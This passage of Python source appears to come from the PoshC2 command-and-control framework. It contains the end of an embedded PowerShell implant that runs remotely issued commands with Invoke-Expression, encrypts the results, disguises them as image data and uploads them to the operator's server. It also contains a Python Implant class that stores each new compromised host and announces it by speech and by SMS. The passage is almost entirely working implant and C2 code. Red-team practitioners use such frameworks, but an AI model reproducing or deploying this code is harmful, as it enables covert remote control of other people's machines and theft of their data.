                                $Output = Invoke-Expression $modulename | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } else {
                            try {
                                $Output = Invoke-Expression $i | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $StdError = ($error[0] | Out-String)
                                if ($StdError){
                                $Output = $Output + $StdError
                                $error.clear()
                                }
                            } catch {
                                $Output = "ErrorCmd: " + $error[0]
                            }
                            try {
                            $Output = Encrypt-String2 $key $Output
                            $Response = Encrypt-String $key $i
                            $UploadBytes = getimgdata $Output
                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
                            } catch{}
                        }
                    } 
            }
            elseif ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                try {
                $Output = Invoke-Expression $ReadCommandClear | out-string
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                $ModuleLoaded = Encrypt-String $key $result
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorUpload: " + $error[0]
                }

            } elseif ($ReadCommandClear.ToLower().StartsWith("download-file")) {
                try {
                    Invoke-Expression $ReadCommandClear | Out-Null
                }
                catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }
            } elseif ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                try {
                $modulename = $ReadCommandClear -replace "LoadModule",""
                $Output = Invoke-Expression $modulename | out-string  
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }

            } else {
                try {
                    $Output = Invoke-Expression $ReadCommandClear | out-string  
                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                    $StdError = ($error[0] | Out-String)
                    if ($StdError){
                    $Output = $Output + $StdError
                    $error.clear()
                    }
                } catch {
                    $Output = "ErrorCmd: " + $error[0]
                }
            try {
            $Output = Encrypt-String2 $key $Output
            $UploadBytes = getimgdata $Output
            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
            } catch {}
            }
            $ReadCommandClear = $null
            $ReadCommand = $null
        }
    break
    }
}""" % (self.Key, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs)
#Add all db elements 

  def display(self):
    print Colours.GREEN,""
    it = self.Pivot
    if (it == "OSX"):
      it = "Python"
    print "New %s implant connected: (uri=%s key=%s)" % (it, self.RandomURI, self.Key)
    print "%s | URL:%s | Time:%s | PID:%s | Sleep:%s | %s (%s) " % (self.IPAddress, self.Proxy, self.FirstSeen, 
      self.PID, self.Sleep, self.Domain, self.Arch)
    print "",Colours.END

    try:
      sound = select_item("Sounds","C2Server")
      if sound == "Yes":
        import pyttsx3
        engine = pyttsx3.init()
        rate = engine.getProperty('rate')
        voices = engine.getProperty('voices')
        engine.setProperty('voice', "english-us")
        engine.setProperty('rate', rate-30)
        engine.say("Nice, we have an implant")
        engine.runAndWait()
    except Exception as e:
      EspeakError = "espeak error"      

    try:
      apikey = select_item("APIKEY","C2Server")
      mobile = select_item("MobileNumber","C2Server")

      #import httplib, urllib
      #conn = httplib.HTTPSConnection("api.pushover.net:443")
      #conn.request("POST", "/1/messages.json",
      #  urllib.urlencode({
      #    "token": "",
      #    "user": "",
      #    "message": "NewImplant: %s @ %s" % (self.User,self.Hostname),
      #  }), { "Content-type": "application/x-www-form-urlencoded" })
      #conn.getresponse()

      if apikey and mobile:
        for number in mobile.split(","):
          number = number.replace('"','')
          url = "https://api.clockworksms.com/http/send.aspx?key=%s&to=%s&from=PoshC2&content=NewImplant:%s\%s @ %s" % (apikey, number, self.Domain,self.User,self.Hostname)
          url = url.replace(" ","+")
          response = urllib2.urlopen(url)
    except Exception as e:
      print "SMS send error: %s" % e
      
  def save(self):
    new_implant(self.RandomURI, self.User, self.Hostname, self.IPAddress, self.Key, self.FirstSeen, self.FirstSeen, self.PID, self.Proxy, self.Arch, self.Domain, self.Alive, self.Sleep, self.ModsLoaded, self.Pivot)

  def autoruns(self):
    new_task("loadmodule Implant-Core.ps1", self.RandomURI)
    update_mods("Implant-Core.ps1", self.RandomURI)
    result = get_autoruns()
    if result:
      autoruns = ""
      for autorun in result:
        new_task(autorun[1], self.RandomURI)